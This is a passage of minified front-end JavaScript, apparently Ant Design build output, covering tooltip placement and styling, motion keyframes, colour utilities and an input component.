${f}-arrow`]:{left:{_skip_check_:!0,value:"50%"},transform:"translateX(-50%) translateY(-100%)"},"&-placement-bottomLeft":{[v("arrow-offset-x")]:b,[`> ${f}-arrow`]:{left:{_skip_check_:!0,value:b}}},"&-placement-bottomRight":{[v("arrow-offset-x")]:`calc(100% - ${(0,i.unit)(b)})`,[`> ${f}-arrow`]:{right:{_skip_check_:!0,value:b}}}},a?l:{}),...(u=!!x.left,d={[`&-placement-left > ${f}-arrow,&-placement-leftTop > ${f}-arrow,&-placement-leftBottom > ${f}-arrow`]:{right:{_skip_check_:!0,value:S},transform:"translateX(100%) rotate(90deg)"},[`&-placement-left > ${f}-arrow`]:{top:{_skip_check_:!0,value:"50%"},transform:"translateY(-50%) translateX(100%) rotate(90deg)"},[`&-placement-leftTop > ${f}-arrow`]:{top:h},[`&-placement-leftBottom > ${f}-arrow`]:{bottom:h}},u?d:{}),...(p=!!x.right,m={[`&-placement-right > ${f}-arrow,&-placement-rightTop > ${f}-arrow,&-placement-rightBottom > ${f}-arrow`]:{left:{_skip_check_:!0,value:S},transform:"translateX(-100%) rotate(-90deg)"},[`&-placement-right > ${f}-arrow`]:{top:{_skip_check_:!0,value:"50%"},transform:"translateY(-50%) translateX(-100%) rotate(-90deg)"},[`&-placement-rightTop > ${f}-arrow`]:{top:h},[`&-placement-rightBottom > ${f}-arrow`]:{bottom:h}},p?m:{})}}},"getArrowOffsetToken",()=>u],20560);let d={left:{points:["cr","cl"]},right:{points:["cl","cr"]},top:{points:["bc","tc"]},bottom:{points:["tc","bc"]},topLeft:{points:["bl","tl"]},leftTop:{points:["tr","tl"]},topRight:{points:["br","tr"]},rightTop:{points:["tl","tr"]},bottomRight:{points:["tr","br"]},rightBottom:{points:["bl","br"]},bottomLeft:{points:["tl","bl"]},leftBottom:{points:["br","bl"]}},p={topLeft:{points:["bl","tc"]},leftTop:{points:["tr","cl"]},topRight:{points:["br","tc"]},rightTop:{points:["tl","cr"]},bottomRight:{points:["tr","bc"]},rightBottom:{points:["bl","cr"]},bottomLeft:{points:["tl","bc"]},leftBottom:{points:["br","cl"]}},m=new Set(["topLeft","topRight","bottomLeft","bottomRight","leftTop","leftBottom","rightTop","rightBottom"]);function f(e){let{arrowWidth:t,autoAdjustOverflow:r,arrowPointAtCenter:n,offset:o,borderRadius:a,visibleFirst:i}=e,s=t/2,l={},c=u({contentRadius:a,limitVerticalRadius:!0});return Object.keys(d).forEach(e=>{let a={...n&&p[e]||d[e],offset:[0,0],dynamicInset:!0};switch(l[e]=a,m.has(e)&&(a.autoArrow=!1),e){case"top":case"topLeft":case"topRight":a.offset[1]=-s-o;break;case"bottom":case"bottomLeft":case"bottomRight":a.offset[1]=s+o;break;case"left":case"leftTop":case"leftBottom":a.offset[0]=-s-o;break;case"right":case"rightTop":case"rightBottom":a.offset[0]=s+o}if(n)switch(e){case"topLeft":case"bottomLeft":a.offset[0]=-c.arrowOffsetHorizontal-s;break;case"topRight":case"bottomRight":a.offset[0]=c.arrowOffsetHorizontal+s;break;case"leftTop":case"rightTop":a.offset[1]=-(2*c.arrowOffsetHorizontal)+s;break;case"leftBottom":case"rightBottom":a.offset[1]=2*c.arrowOffsetHorizontal-s}a.overflow=function(e,t,r,n){if(!1===n)return{adjustX:!1,adjustY:!1};let o={};switch(e){case"top":case"bottom":o.shiftX=2*t.arrowOffsetHorizontal+r,o.shiftY=!0,o.adjustY=!0;break;case"left":case"right":o.shiftY=2*t.arrowOffsetVertical+r,o.shiftX=!0,o.adjustX=!0}let a={...o,...n&&"object"==typeof n?n:{}};return a.shiftX||(a.adjustX=!0),a.shiftY||(a.adjustY=!0),a}(e,c,t,r),i&&(a.htmlRegion="visibleFirst")}),l}e.s(["default",()=>f],5984)},63731,e=>{"use strict";var t=e.i(71645);function r(e){return e&&t.default.isValidElement(e)&&e.type===t.default.Fragment}let n=(e,r,n)=>t.default.isValidElement(e)?t.default.cloneElement(e,"function"==typeof n?n(e.props||{}):n):r;function o(e,t){return n(e,e,t)}e.s(["cloneElement",()=>o,"isFragment",()=>r,"replaceElement",0,n])},47656,e=>{"use strict";e.i(47167);var t=e.i(71645);e.i(63335);var r=e.i(24308),r=r;function n(){}let{resetWarned:o}=r.default,a=t.createContext({});e.s(["WarningContext",0,a,"devUseWarning",0,()=>{let e=()=>{};return e.deprecated=n,e}],47656)},4458,e=>{"use strict";var t=e.i(19581);e.s(["useToken",()=>t.default])},96158,92656,9656,17356,e=>{"use strict";var t=e.i(71645);e.s(["default",0,(e,r)=>{let n=e=>"boolean"==typeof e?{show:e}:e||{};return t.default.useMemo(()=>{let t=n(e),o=n(r);return{...o,...t,show:t.show??o.show??!0}},[e,r])}],96158);var r=e.i(95220);e.s(["Popup",()=>r.default],92656),e.i(96059);var n=e.i(94758),o=e.i(2366);let a=new n.Keyframes("antFadeIn",{"0%":{opacity:0},"100%":{opacity:1}}),i=new n.Keyframes("antFadeOut",{"0%":{opacity:1},"100%":{opacity:0}});e.s(["initFadeMotion",0,(e,t=!1)=>{let{antCls:r}=e,n=`${r}-fade`,s=t?"&":"";return[(0,o.initMotion)(n,a,i,e.motionDurationMid,t),{[`
        ${s}${n}-enter,
        ${s}${n}-appear
      `]:{opacity:0,animationTimingFunction:"linear"},[`${s}${n}-leave`]:{animationTimingFunction:"linear"}}]}],9656);let s=new n.Keyframes("antZoomIn",{"0%":{transform:"scale(0.2)",opacity:0},"100%":{transform:"scale(1)",opacity:1}}),l=new n.Keyframes("antZoomOut",{"0%":{transform:"scale(1)"},"100%":{transform:"scale(0.2)",opacity:0}}),c=new n.Keyframes("antZoomBigIn",{"0%":{transform:"scale(0.8)",opacity:0},"100%":{transform:"scale(1)",opacity:1}}),u=new n.Keyframes("antZoomBigOut",{"0%":{transform:"scale(1)"},"100%":{transform:"scale(0.8)",opacity:0}}),d=new n.Keyframes("antZoomUpIn",{"0%":{transform:"scale(0.8)",transformOrigin:"50% 0%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"50% 0%"}}),p=new n.Keyframes("antZoomUpOut",{"0%":{transform:"scale(1)",transformOrigin:"50% 0%"},"100%":{transform:"scale(0.8)",transformOrigin:"50% 0%",opacity:0}}),m={zoom:{inKeyframes:s,outKeyframes:l},"zoom-big":{inKeyframes:c,outKeyframes:u},"zoom-big-fast":{inKeyframes:c,outKeyframes:u},"zoom-left":{inKeyframes:new n.Keyframes("antZoomLeftIn",{"0%":{transform:"scale(0.8)",transformOrigin:"0% 50%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"0% 50%"}}),outKeyframes:new n.Keyframes("antZoomLeftOut",{"0%":{transform:"scale(1)",transformOrigin:"0% 50%"},"100%":{transform:"scale(0.8)",transformOrigin:"0% 50%",opacity:0}})},"zoom-right":{inKeyframes:new n.Keyframes("antZoomRightIn",{"0%":{transform:"scale(0.8)",transformOrigin:"100% 50%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"100% 50%"}}),outKeyframes:new n.Keyframes("antZoomRightOut",{"0%":{transform:"scale(1)",transformOrigin:"100% 50%"},"100%":{transform:"scale(0.8)",transformOrigin:"100% 50%",opacity:0}})},"zoom-up":{inKeyframes:d,outKeyframes:p},"zoom-down":{inKeyframes:new n.Keyframes("antZoomDownIn",{"0%":{transform:"scale(0.8)",transformOrigin:"50% 100%",opacity:0},"100%":{transform:"scale(1)",transformOrigin:"50% 100%"}}),outKeyframes:new n.Keyframes("antZoomDownOut",{"0%":{transform:"scale(1)",transformOrigin:"50% 100%"},"100%":{transform:"scale(0.8)",transformOrigin:"50% 100%",opacity:0}})}};e.s(["initZoomMotion",0,(e,t)=>{let{antCls:r}=e,n=`${r}-${t}`,{inKeyframes:a,outKeyframes:i}=m[t];return[(0,o.initMotion)(n,a,i,"zoom-big-fast"===t?e.motionDurationFast:e.motionDurationMid),{[`
        ${n}-enter,
        ${n}-appear
      `]:{transform:"scale(0)",opacity:0,animationTimingFunction:e.motionEaseOutCirc,"&-prepare":{transform:"none"}},[`${n}-leave`]:{animationTimingFunction:e.motionEaseInOutCirc}}]}],17356)},3541,e=>{"use strict";var t=e.i(17933);function r(e,r){return t.PresetColors.reduce((t,n)=>{let o=e[`${n}1`],a=e[`${n}3`],i=e[`${n}6`],s=e[`${n}7`];return{...t,...r(n,{lightColor:o,lightBorderColor:a,darkColor:i,textColor:s})}},{})}e.s(["genPresetColor",()=>r],3541)},40270,e=>{"use strict";e.i(96059);var t=e.i(15654),r=e.i(83293),n=e.i(9656),o=e.i(17356),a=e.i(20560),i=e.i(7358),s=e.i(3541),l=e.i(46422),c=e.i(38378);let u=e=>({zIndexPopup:e.zIndexPopupBase+70,maxWidth:250,...(0,a.getArrowOffsetToken)({contentRadius:e.borderRadius,limitVerticalRadius:!0}),...(0,i.getArrowToken)((0,c.mergeToken)(e,{borderRadiusOuter:Math.min(e.borderRadiusOuter,4)}))});e.s(["default",0,(e,i,d=!0)=>(0,l.genStyleHooks)("Tooltip",e=>{let{borderRadius:i,colorTextLightSolid:u,colorBgSpotlight:d,maxWidth:p}=e;return[(e=>{let{calc:o,componentCls:i,tooltipMaxWidth:c,tooltipColor:u,tooltipBg:d,tooltipBorderRadius:p,zIndexPopup:m,controlHeight:f,boxShadowSecondary:g,paddingSM:h,paddingXS:b,arrowOffsetHorizontal:y,sizePopupArrow:v,antCls:S}=e,[x,C]=(0,l.genCssVar)(S,"tooltip"),w=o(p).add(v).add(y).equal(),k={minWidth:o(p).mul(2).add(v).equal(),minHeight:f,padding:`${(0,t.unit)(e.calc(h).div(2).equal())} ${(0,t.unit)(b)}`,color:C("overlay-color",u),textAlign:"start",textDecoration:"none",wordWrap:"break-word",backgroundColor:d,borderRadius:p,boxShadow:g,boxSizing:"border-box"},$={[x("valid-offset-x")]:C("arrow-offset-x","var(--arrow-x)"),transformOrigin:[C("valid-offset-x","50%"),"var(--arrow-y, 50%)"].join(" ")};return[{[i]:{...(0,r.resetComponent)(e),position:"absolute",zIndex:m,display:"block",width:"max-content",maxWidth:c,visibility:"visible",...$,"&-hidden":{display:"none"},[x("arrow-background-color")]:d,[`${i}-container`]:[k,(0,n.initFadeMotion)(e,!0)],[`&:has(~ ${i}-unique-container)`]:{[`${i}-container`]:{border:"none",background:"transparent",boxShadow:"none"}},"&-placement-topLeft,&-placement-topRight,&-placement-bottomLeft,&-placement-bottomRight":{minWidth:w},"&-placement-left,&-placement-leftTop,&-placement-leftBottom,&-placement-right,&-placement-rightTop,&-placement-rightBottom":{[`${i}-inner`]:{borderRadius:e.min(p,a.MAX_VERTICAL_CONTENT_RADIUS)}},[`${i}-content`]:{position:"relative"},...(0,s.genPresetColor)(e,(e,{darkColor:t})=>({[`&${i}-${e}`]:{[`${i}-container`]:{backgroundColor:t},[`${i}-arrow`]:{[x("arrow-background-color")]:t}}})),"&-rtl":{direction:"rtl"}}},(0,a.default)(e,C("arrow-background-color")),{[`${i}-pure`]:{position:"relative",maxWidth:"none",margin:e.sizePopupArrow}},{[`${i}-unique-container`]:{...k,...$,position:"absolute",zIndex:o(m).sub(1).equal(),"&-hidden":{display:"none"},"&-visible":{transition:`all ${e.motionDurationSlow}`}}}]})((0,c.mergeToken)(e,{tooltipMaxWidth:p,tooltipColor:u,tooltipBorderRadius:i,tooltipBg:d})),(0,o.initZoomMotion)(e,"zoom-big-fast")]},u,{resetStyle:!1,injectStyle:d})(e,i)])},2779,e=>{"use strict";var t=e.i(8211),r=e.i(17933);let n=r.PresetColors.map(e=>`${e}-inverse`),o=["success","processing","error","default","warning"];function a(e,o=!0){return o?[].concat((0,t.default)(n),(0,t.default)(r.PresetColors)).includes(e):r.PresetColors.includes(e)}function i(e){return o.includes(e)}e.s(["isPresetColor",()=>a,"isPresetStatusColor",()=>i])},71070,14690,62464,9808,e=>{"use strict";var t=e.i(78409),r=e.i(33848);e.i(47167);var n=e.i(71645);e.i(62370);var o=e.i(35551);let a=e=>Math.round(Number(e||0));class i extends o.FastColor{constructor(e){super((e=>{if(e instanceof o.FastColor)return e;if(e&&"object"==typeof e&&"h"in e&&"b"in e){let{b:t,...r}=e;return{...r,v:t}}return"string"==typeof e&&/hsb/.test(e)?e.replace(/hsb/,"hsv"):e})(e))}toHsbString(){let e=this.toHsb(),t=a(100*e.s),r=a(100*e.b),n=a(e.h),o=e.a,i=`hsb(${n}, ${t}%, ${r}%)`,s=`hsba(${n}, ${t}%, ${r}%, ${o.toFixed(2*(0!==o))})`;return 1===o?i:s}toHsb(){let{v:e,...t}=this.toHsv();return{...t,b:e,a:this.a}}}e.s(["Color",()=>i],14690);let s=e=>e instanceof i?e:new i(e),l=(s("#1677ff"),e=>{let{offset:t,targetRef:r,containerRef:n,color:o,type:a}=e,{width:i,height:l}=n.current.getBoundingClientRect(),{width:c,height:u}=r.current.getBoundingClientRect(),d=c/2,p=(t.x+d)/i,m=1-(t.y+u/2)/l,f=o.toHsb(),g=(t.x+d)/i*360;if(a)switch(a){case"hue":return s({...f,h:g<=0?0:g});case"alpha":return s({...f,a:p<=0?0:p})}return s({h:f.h,s:p<=0?0:p,b:m>=1?1:m,a:f.a})});var c=e.i(7670);e.s(["default",0,({color:e,prefixCls:t,className:r,style:o,innerClassName:a,innerStyle:i,onClick:s})=>{let l=`${t}-color-block`;return n.default.createElement("div",{className:(0,c.clsx)(l,r),style:o,onClick:s},n.default.createElement("div",{className:(0,c.clsx)(`${l}-inner`,a),style:{background:e,...i}}))}],62464);e.i(63335);e.i(80251);(e,t)=>{let{children:r,x:o,y:a}=e;return n.default.createElement("div",{ref:t,style:{position:"absolute",left:`${o}%`,top:`${a}%`,zIndex:1,transform:"translate(-50%, -50%)"}},r)};e.i(30294);e.s([],9808);let u=(0,r.default)(function e(r){if((0,t.default)(this,e),this.cleared=!1,r instanceof e){this.metaColor=r.metaColor.clone(),this.colors=r.colors?.map(t=>({color:new e(t.color),percent:t.percent})),this.cleared=r.cleared;return}let n=Array.isArray(r);n&&r.length?(this.colors=r.map(({color:t,percent:r})=>({color:new e(t),percent:r})),this.metaColor=new i(this.colors[0].color.metaColor)):this.metaColor=new i(n?"":r),r&&(!n||this.colors)||(this.metaColor=this.metaColor.setA(0),this.cleared=!0)},[{key:"toHsb",value:function(){return this.metaColor.toHsb()}},{key:"toHsbString",value:function(){return this.metaColor.toHsbString()}},{key:"toHex",value:function(){var e,t;return e=this.toHexString(),t=this.metaColor.a<1,e&&e?.replace(/[^0-9a-f]/gi,"").slice(0,t?8:6)||""}},{key:"toHexString",value:function(){return this.metaColor.toHexString()}},{key:"toRgb",value:function(){return this.metaColor.toRgb()}},{key:"toRgbString",value:function(){return this.metaColor.toRgbString()}},{key:"isGradient",value:function(){return!!this.colors&&!this.cleared}},{key:"getColors",value:function(){return this.colors||[{color:this,percent:0}]}},{key:"toCssString",value:function(){let{colors:e}=this;if(e){let t=e.map(e=>`${e.color.toRgbString()} ${e.percent}%`).join(", ");return`linear-gradient(90deg, ${t})`}return this.metaColor.toRgbString()}},{key:"equals",value:function(e){return!!e&&this.isGradient()===e.isGradient()&&(this.isGradient()?this.colors.length===e.colors.length&&this.colors.every((t,r)=>{let n=e.colors[r];return t.percent===n.percent&&t.color.equals(n.color)}):this.toHexString()===e.toHexString())}}]);e.s(["AggregationColor",()=>u],71070)},56449,e=>{"use strict";e.i(8211),e.i(9808),e.i(14690);var t=e.i(71070);e.s(["generateColor",0,e=>e instanceof t.AggregationColor?e:new t.AggregationColor(e)])},91816,53996,11223,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(37908);e.i(63335);var n=e.i(30294),o=e.i(7670),a=e.i(17206),i=e.i(11517),s=e.i(22767),l=e.i(13541),c=e.i(5984),u=e.i(63731),d=e.i(47656),p=e.i(40010),m=e.i(42064),f=e.i(21883),g=e.i(4458),h=e.i(96158),b=e.i(92656),y=e.i(40270),v=e.i(2779),S=e.i(56449),x=e.i(46422);let C=(e,t,r)=>{let n=(0,v.isPresetColor)(r),[a]=(0,x.genCssVar)(e,"tooltip"),i=(0,o.clsx)({[`${t}-${r}`]:r&&n}),s={},l={},c=(0,S.generateColor)(r).toRgb(),u=(.299*c.r+.587*c.g+.114*c.b)/255;return r&&!n&&(s.background=r,s[a("overlay-color")]=u<.5?"#FFF":"#000",l[a("arrow-background-color")]=r),{className:i,overlayStyle:s,arrowStyle:l}};e.i(49637);var w=e.i(42569),w=w,k=e.i(28473);let $=({children:e})=>{let{getPrefixCls:r}=t.default.useContext(m.ConfigContext),n=r();return t.default.isValidElement(e)?t.default.createElement(k.default,{visible:!0,motionName:`${n}-fade`,motionAppear:!0,motionEnter:!0,motionLeave:!1,removeOnLeave:!1},({style:t,className:r})=>(0,u.cloneElement)(e,e=>({className:(0,o.clsx)(e.className,r),style:{...e.style,...t}}))):e},E=[null,null],P=({children:e})=>t.default.createElement(w.default,{postTriggerProps:e=>{let{id:r,builtinPlacements:n,popup:o}=e,a="function"==typeof o?o():o,i=function(e){if(E[0]!==e){let t={};Object.keys(e).forEach(r=>{t[r]={...e[r],dynamicInset:!1}}),E[0]=e,E[1]=t}return E[1]}(n);return{...e,getPopupContainer:null,arrow:!1,popup:t.default.createElement($,{key:r},a),builtinPlacements:i}}},e);e.s(["default",0,P],53996);let T=t.forwardRef((e,b)=>{let{prefixCls:v,openClassName:S,getTooltipContainer:x,color:w,children:k,afterOpenChange:$,arrow:E,destroyTooltipOnHide:P,destroyOnHidden:T,title:I,overlay:M,trigger:R,builtinPlacements:A,autoAdjustOverflow:D=!0,motion:L,getPopupContainer:_,placement:O="top",mouseEnterDelay:N=.1,mouseLeaveDelay:F=.1,rootClassName:j,styles:H,classNames:B,onOpenChange:z,overlayInnerStyle:V,overlayStyle:W,overlayClassName:U,...q}=e,[,G]=(0,g.useToken)(),{getPopupContainer:J,getPrefixCls:X,direction:K,className:Q,style:Y,classNames:Z,styles:ee,arrow:et,trigger:er}=(0,m.useComponentConfig)("tooltip"),en=(0,h.default)(E,et),eo=en.show,ea=R||er||"hover";(0,d.devUseWarning)("Tooltip");let ei=t.useRef(null),es=()=>{ei.current?.forceAlign()};t.useImperativeHandle(b,()=>({forceAlign:es,nativeElement:ei.current?.nativeElement,popupElement:ei.current?.popupElement}));let[el,ec]=(0,n.useControlledState)(e.defaultOpen??!1,e.open),eu=!I&&!M&&0!==I,ed=t.useMemo(()=>A||(0,c.default)({arrowPointAtCenter:en?.pointAtCenter??!1,autoAdjustOverflow:D,arrowWidth:eo?G.sizePopupArrow:0,borderRadius:G.borderRadius,offset:G.marginXXS,visibleFirst:!0}),[en,A,G,eo,D]),ep=t.useMemo(()=>0===I?I:M||I||"",[M,I]),em=t.createElement(a.default,{space:!0,form:!0},"function"==typeof ep?ep():ep),ef={...e,trigger:ea,color:w,placement:O,builtinPlacements:A,openClassName:S,arrow:E,autoAdjustOverflow:D,getPopupContainer:_,children:k,destroyTooltipOnHide:P,destroyOnHidden:T},[eg,eh]=(0,i.useMergeSemantic)([Z,B],[ee,H],{props:ef}),eb=X("tooltip",v),ey=X(),ev=e["data-popover-inject"],eS=el;"open"in e||!eu||(eS=!1);let ex=t.isValidElement(k)&&!(0,u.isFragment)(k)?k:t.createElement("span",null,k),eC=ex.props,ew=eC.className&&"string"!=typeof eC.className?eC.className:(0,o.clsx)(eC.className,S||`${eb}-open`),ek=(0,f.default)(eb),[e$,eE]=(0,y.default)(eb,ek,!ev),eP=C(ey,eb,w),eT=eP.arrowStyle,eI=(0,o.clsx)(ek,e$,eE),eM=(0,o.clsx)(U,{[`${eb}-rtl`]:"rtl"===K},eP.className,j,eI,Q,eg.root),[eR,eA]=(0,s.useZIndex)("Tooltip",q.zIndex),eD={...eh.container,...V,...eP.overlayStyle},eL=t.createElement(r.default,{unique:!0,...q,trigger:ea,zIndex:eR,showArrow:eo,placement:O,mouseEnterDelay:N,mouseLeaveDelay:F,prefixCls:eb,classNames:{root:eM,container:eg.container,arrow:eg.arrow,uniqueContainer:(0,o.clsx)(eI,eg.container)},styles:{root:{...eT,...eh.root,...Y,...W},container:eD,uniqueContainer:eD,arrow:eh.arrow},getTooltipContainer:_||x||J,ref:ei,builtinPlacements:ed,overlay:em,visible:eS,onVisibleChange:e=>{ec(!eu&&e),!eu&&z&&z(e)},afterVisibleChange:$,arrowContent:t.createElement("span",{className:`${eb}-arrow-content`}),motion:{motionName:(0,l.getTransitionName)(ey,"zoom-big-fast","string"==typeof L?.motionName?L?.motionName:void 0),motionDeadline:1e3},destroyOnHidden:T??!!P},eS?(0,u.cloneElement)(ex,{className:ew}):ex);return t.createElement(p.default.Provider,{value:eA},eL)});T._InternalPanelDoNotUseOrYouWillBeFired=e=>{let{prefixCls:r,className:n,placement:a="top",title:s,color:l,overlayInnerStyle:c,classNames:u,styles:d}=e,{getPrefixCls:p}=t.useContext(m.ConfigContext),g=p("tooltip",r),h=p(),v=(0,f.default)(g),[S,x]=(0,y.default)(g,v),w=C(h,g,l),k=w.arrowStyle,$=t.useMemo(()=>({container:{...c,...w.overlayStyle}}),[c,w.overlayStyle]),E={...e,placement:a},[P,T]=(0,i.useMergeSemantic)([u],[$,d],{props:E}),I=(0,o.clsx)(v,S,x,g,`${g}-pure`,`${g}-placement-${a}`,n,w.className);return t.createElement("div",{className:I,style:k},t.createElement("div",{className:`${g}-arrow`}),t.createElement(b.Popup,{...e,className:S,prefixCls:g,classNames:P,styles:T},s))},T.UniqueProvider=P,e.s(["default",0,T],91816);let I={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M864 170h-60c-4.4 0-8 3.6-8 8v518H310v-73c0-6.7-7.8-10.5-13-6.3l-141.9 112a8 8 0 000 12.6l141.9 112c5.3 4.2 13 .4 13-6.3v-75h498c35.3 0 64-28.7 64-64V178c0-4.4-3.6-8-8-8z"}}]},name:"enter",theme:"outlined"};var M=e.i(9583);function R(){return(R=Object.assign.bind()).apply(this,arguments)}let A=t.forwardRef((e,r)=>t.createElement(M.default,R({},e,{ref:r,icon:I})));e.s(["default",0,A],11223)},56419,53467,59422,51124,e=>{"use strict";var t=e.i(7670),r=e.i(71645);function n(e){return!!(e.addonBefore||e.addonAfter)}function o(e){return!!(e.prefix||e.suffix||e.allowClear)}function a(e,t,r){let n=t.cloneNode(!0),o=Object.create(e,{target:{value:n},currentTarget:{value:n}});return n.value=r,"number"==typeof t.selectionStart&&"number"==typeof t.selectionEnd&&(n.selectionStart=t.selectionStart,n.selectionEnd=t.selectionEnd),n.setSelectionRange=(...e)=>{t.setSelectionRange(...e)},o}function i(e,t,r,n){if(!r)return;let o=t;"click"===t.type?r(o=a(t,e,"")):"file"!==e.type&&void 0!==n?r(o=a(t,e,n)):r(o)}function s(){return(s=Object.assign.bind()).apply(this,arguments)}e.s(["hasAddon",()=>n,"hasPrefixSuffix",()=>o,"resolveOnChange",()=>i],53467);let l=r.default.forwardRef((e,a)=>{let{inputElement:i,children:l,prefixCls:c,prefix:u,suffix:d,addonBefore:p,addonAfter:m,className:f,style:g,disabled:h,readOnly:b,focused:y,triggerFocus:v,allowClear:S,value:x,handleReset:C,hidden:w,classes:k,classNames:$,dataAttrs:E,styles:P,components:T,onClear:I}=e,M=l??i,R=T?.affixWrapper||"span",A=T?.groupWrapper||"span",D=T?.wrapper||"span",L=T?.groupAddon||"span",_=(0,r.useRef)(null),O=o(e),N=(0,r.cloneElement)(M,{value:x,className:(0,t.clsx)(M.props?.className,!O&&$?.variant)||null}),F=(0,r.useRef)(null);if(r.default.useImperativeHandle(a,()=>({nativeElement:F.current||_.current})),O){let e=null;if(S){let n=!h&&!b&&x,o=`${c}-clear-icon`,a="object"==typeof S&&S?.clearIcon?S.clearIcon:"✖";e=r.default.createElement("button",{type:"button",tabIndex:-1,onClick:e=>{C?.(e),I?.()},onMouseDown:e=>e.preventDefault(),className:(0,t.clsx)(o,{[`${o}-hidden`]:!n,[`${o}-has-suffix`]:!!d})},a)}let n=`${c}-affix-wrapper`,o=(0,t.clsx)(n,{[`${c}-disabled`]:h,[`${n}-disabled`]:h,[`${n}-focused`]:y,[`${n}-readonly`]:b,[`${n}-input-with-clear-btn`]:d&&S&&x},k?.affixWrapper,$?.affixWrapper,$?.variant),a=(d||S)&&r.default.createElement("span",{className:(0,t.clsx)(`${c}-suffix`,$?.suffix),style:P?.suffix},e,d);N=r.default.createElement(R,s({className:o,style:P?.affixWrapper,onClick:e=>{_.current?.contains(e.target)&&v?.()}},E?.affixWrapper,{ref:_}),u&&r.default.createElement("span",{className:(0,t.clsx)(`${c}-prefix`,$?.prefix),style:P?.prefix},u),N,a)}if(n(e)){let e=`${c}-group`,n=`${e}-addon`,o=`${e}-wrapper`,a=(0,t.clsx)(`${c}-wrapper`,e,k?.wrapper,$?.wrapper),i=(0,t.clsx)(o,{[`${o}-disabled`]:h},k?.group,$?.groupWrapper);N=r.default.createElement(A,{className:i,ref:F},r.default.createElement(D,{className:a},p&&r.default.createElement(L,{className:n},p),N,m&&r.default.createElement(L,{className:n},m)))}return r.default.cloneElement(N,{className:(0,t.clsx)(N.props?.className,f)||null,style:{...N.props?.style,...g},hidden:w})});e.s(["default",0,l],59422);var c=e.i(40383),u=e.i(80573);function d(e,t){return r.useMemo(()=>{let r={};t&&(r.show="object"==typeof t&&t.formatter?t.formatter:!!t);let{show:n,...o}=r={...r,...e};return{...o,show:!!n,showFormatter:"function"==typeof n?n:void 0,strategy:o.strategy||(e=>e.length)}},[e,t])}e.s(["default",()=>d],51124);var p=e.i(63611);function m(){return(m=Object.assign.bind()).apply(this,arguments)}let f=(0,r.forwardRef)((e,n)=>{let o,{autoComplete:a,onChange:s,onFocus:f,onBlur:g,onPressEnter:h,onKeyDown:b,onKeyUp:y,prefixCls:v="rc-input",disabled:S,htmlSize:x,className:C,maxLength:w,suffix:k,showCount:$,count:E,type:P="text",classes:T,classNames:I,styles:M,onCompositionStart:R,onCompositionEnd:A,...D}=e,[L,_]=(0,r.useState)(!1),O=(0,r.useRef)(!1),N=(0,r.useRef)(!1),F=(0,r.useRef)(null),j=(0,r.useRef)(null),H=e=>{F.current&&(0,p.triggerFocus)(F.current,e)},[B,z]=(0,c.default)(e.defaultValue,e.value),V=null==B?"":String(B),[W,U]=(0,r.useState)(null),q=d(E,$),G=q.max||w,J=q.strategy(V),X=!!G&&J>G;(0,r.useImperativeHandle)(n,()=>({focus:H,blur:()=>{F.current?.blur()},setSelectionRange:(e,t,r)=>{F.current?.setSelectionRange(e,t,r)},select:()=>{F.current?.select()},input:F.current,nativeElement:j.current?.nativeElement||F.current})),(0,r.useEffect)(()=>{N.current&&(N.current=!1),_(e=>(!e||!S)&&e)},[S]);let K=(e,t,r)=>{let n=t;if(!O.current&&q.exceedFormatter&&q.max&&q.strategy(t)>q.max)n=q.exceedFormatter(t,{max:q.max}),t!==n&&U([F.current?.selectionStart||0,F.current?.selectionEnd||0]);else if("compositionEnd"===r.source)return;z(n),F.current&&i(F.current,e,s,n)};(0,r.useEffect)(()=>{W&&F.current?.setSelectionRange(...W)},[W]);let Q=X&&`${v}-out-of-range`;return r.default.createElement(l,m({},D,{prefixCls:v,className:(0,t.clsx)(C,Q),handleReset:e=>{z(""),H(),F.current&&i(F.current,e,s)},value:V,focused:L,triggerFocus:H,suffix:(()=>{let e=Number(G)>0;if(k||q.show){let n=q.showFormatter?q.showFormatter({value:V,count:J,maxLength:G}):`${J}${e?` / ${G}`:""}`;return r.default.createElement(r.default.Fragment,null,q.show&&r.default.createElement("span",{className:(0,t.clsx)(`${v}-show-count-suffix`,{[`${v}-show-count-has-suffix`]:!!k},I?.count),style:{...M?.count}},n),k)}return null})(),disabled:S,classes:T,classNames:I,styles:M,ref:j}),(o=(0,u.default)(e,["prefixCls","onPressEnter","addonBefore","addonAfter","prefix","suffix","allowClear","defaultValue","showCount","count","classes","htmlSize","styles","classNames","onClear"]),r.default.createElement("input",m({autoComplete:a},o,{onChange:e=>{K(e,e.target.value,{source:"change"})},onFocus:e=>{_(!0),f?.(e)},onBlur:e=>{N.current&&(N.current=!1),_(!1),g?.(e)},onKeyDown:e=>{!h||"Enter"!==e.key||N.current||e.nativeEvent.isComposing||(N.current=!0,h(e)),b?.(e)},onKeyUp:e=>{"Enter"===e.key&&(N.current=!1),y?.(e)},className:(0,t.clsx)(v,{[`${v}-disabled`]:S},I?.input),style:M?.input,ref:F,size:x,type:P,onCompositionStart:e=>{O.current=!0,R?.(e)},onCompositionEnd:e=>{O.current=!1,K(e,e.currentTarget.value,{source:"compositionEnd"}),A?.(e)}}))))});e.s(["default",0,f],56419)},63651,e=>{"use strict";let t;e.i(56419);var r=e.i(59422),r=r,n=e.i(51124),o=e.i(53467),a=e.i(40383),i=e.i(7670),s=e.i(71645);e.i(47167);var l=e.i(78052),c=e.i(1676),u=e.i(37434);let d=`
  min-height:0 !important;
  max-height:none !important;
  height:0 !important;
  visibility:hidden !important;
  overflow:hidden !important;
  position:absolute !important;
  z-index:-1000 !important;
  top:0 !important;
  right:0 !important;
  pointer-events: none !important;
